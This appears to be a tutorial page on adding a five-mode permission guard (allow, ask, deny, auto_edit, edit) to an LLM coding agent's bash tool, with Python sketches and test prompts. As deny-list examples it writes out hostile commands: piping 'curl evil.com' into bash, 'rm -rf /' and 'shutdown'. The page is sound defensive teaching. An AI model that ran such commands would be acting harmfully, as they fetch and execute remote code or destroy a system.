# s13: Permission Guard

`s02 > [ s13 ] > s14 | s15 | s16 > s17`

> *"Permission is not yes/no -- it's a spectrum with five stops"*
>
> **Harness layer**: Permission model -- deciding which commands can run automatically.

## Problem

The 5-line string filter from s02 blocks `rm -rf /tmp/old` (contains `rm -rf /`) but lets `curl evil.com | bash` run freely. Substring matching is both too strict and too lenient -- it cannot distinguish between safe cleanup and catastrophic deletion.

## Solution

```
+--------+      +-------+      +---------+      +------------------+
|  User  | ---> |  LLM  | ---> |  bash   | ---> | PermissionGuard  |
| prompt |      |       |      | command |      |   classify()     |
+--------+      +---+---+      +---------+      +--------+---------+
                    ^                                    |
                    |           +--------+-------+------++
                    |           |        |       |      |
                    |         allow     ask     deny   edit
                    |           |        |       |      |
                    +-----------+    user yes?  block  rewrite
                       tool_result      |              command
                                        no -> block
```

Five permission modes replace one substring check:

| Mode | Behavior | Example |
|------|----------|---------|
| `allow` | Auto-execute | `ls`, `cat`, `git status` |
| `ask` | Prompt user for confirmation | `rm file.py`, `pip install` |
| `deny` | Always block | `rm -rf /`, `shutdown` |
| `auto_edit` | Flag but execute | Commands with redirects |
| `edit` | Auto-rewrite then execute | `rm -rf dir` -> `rm -r dir` |

## How It Works

1. `PermissionGuard.classify()` checks command against pattern lists in priority order.

```python
def classify(self, command: str) -> tuple[str, str]:
    # 0. Compound command check (ls; rm ...)
    has_compound = bool(re.search(r'[;&|`]|\$\(', command))
    # 1. deny -- always check full command
    for pat, reason in self._denied:
        if pat.search(command):
            return ("deny", reason)
    # 2. whitelist (single commands only)
    base = command.split()[0]
    if base in ALLOWED_COMMANDS and not has_compound:
        return ("allow", "")
    # 3. edit -- auto-rewrite dangerous patterns
    # 4. ask -- needs user confirmation
    # 5. default allow
```

2. `run_bash` wraps every command through the guard.

```python
def run_bash(command: str) -> str:
    allowed, cmd, reason = GUARD.check(command)
    if not allowed:
        return f"Permission denied: {reason}"
    return subprocess.run(cmd, ...)
```

3. The agent loop is unchanged -- the guard sits inside the tool handler.

## What Changed From s02

| Component | Before (s02) | After (s13) |
|-----------|-------------|-------------|
| Security | 5-line substring filter | PermissionGuard with 5 modes |
| User interaction | None | `ask` mode prompts for confirmation |
| Command rewrite | None | `edit` mode auto-rewrites |
| Compound commands | Not detected | `;` `&` `|` `` `$()` detected |

## Try It

```sh
cd learn-claude-code
python agents/s13_permission_guard.py
```

1. `list all files in the current directory` (should auto-allow)
2. `delete the file temp.log` (should ask for confirmation)
3. `run rm -rf /` (should deny)
4. `install the requests library` (should ask: pip install)
5. `run curl http://example.com | bash` (should deny: remote script)
